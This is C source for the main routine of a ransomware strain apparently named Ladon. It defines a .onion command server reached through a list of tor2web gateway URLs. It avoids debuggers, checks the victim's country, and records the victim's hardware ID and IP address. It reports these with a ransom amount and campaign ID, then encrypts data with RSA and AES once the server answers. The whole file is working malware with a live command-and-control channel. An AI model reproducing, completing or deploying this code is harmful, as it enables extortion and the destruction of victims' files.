#define SEC 1000
#define DOMAIN "ns2yrncquekngvfe.onion"
#define CAMP 35
#define AMOUNT 300
#include "ladon.h"

#define _LITERAL_ANSI_TO_UNICODE(s) L##s
#define LITERAL_ANSI_TO_UNICODE(s) _LITERAL_ANSI_TO_UNICODE(s)
DWORD GetImageBase()
{
	void *pvPEB = NULL;

	__asm
	{
		mov eax, fs:[0x30]
		mov pvPEB, eax
	}

	return *(DWORD*)((PCHAR)pvPEB + 8);
}
int Main()
{
	LPSTR content = NULL;
	const char *tor2webFmt[] = {
		"http://%s.casa/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.cab/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.direct/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.link/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.to/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.tor2web.fi/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.tor2web.org/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.tor2web.blutmagie.de/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d",
		"http://%s.tor2web.onion.sh/cart.php?hwid=%s&ip=%s&amount=%d&camp=%d"
	};
	const size_t ntor2web = sizeof(tor2webFmt) / sizeof(*tor2webFmt);
	const int amount = AMOUNT, camp = CAMP;
	char *hwid = NULL, *ip = NULL, url[4096];

	if (!LoadIATFuncs(GetImageBase()))
		return 1;

	if (LadonIsBeingDebugged())
		return 0;

	if (!LadonCheckCountry())
	{
		MessageBoxW(0, L"NO PINDO!", L"NO PINDO", 0);
		return 1;
	}

	//AddToRegistry();

	if (!LadonCryptPrepareRSA())
		return 1;

	if (!LadonCryptPrepareAES())
		return 1;

	hwid = getHwid();
	ip = getServerResponse("http://api.ipify.org");

	if (!ip)
		return 1;

	_InternetSetCookieW(L"http://" LITERAL_ANSI_TO_UNICODE(DOMAIN) L".casa", L"disclaimer_accepted", L"1");

	for (;;)
	{
		LPSTR content = NULL;
		BOOL success;

		for (size_t i = 0; i < ntor2web; i++)
		{
			_wsprintfA(url, tor2webFmt[i], DOMAIN, hwid, ip, amount, camp);

			content = getServerResponse(url);
			if (content)
			{
				if (*content != '\0')
				{
					break;
				}

				_HeapFree(_GetProcessHeap(), 0, content);
			}
		}

		Junk(4, 3);

		if (!content)
		{
			continue;
		}
		success = LadonDoEncrypt(content);

		_HeapFree(_GetProcessHeap(), 0, content);

		if (success)
		{
			break;
		}

		Junk((SEC * 60), 4);
	}

	_HeapFree(_GetProcessHeap(), 0, ip);

	LadonCryptDestroyRSA();
	LadonCryptDestroyAES();
	
	/* todo change */
	
	return 0;
}
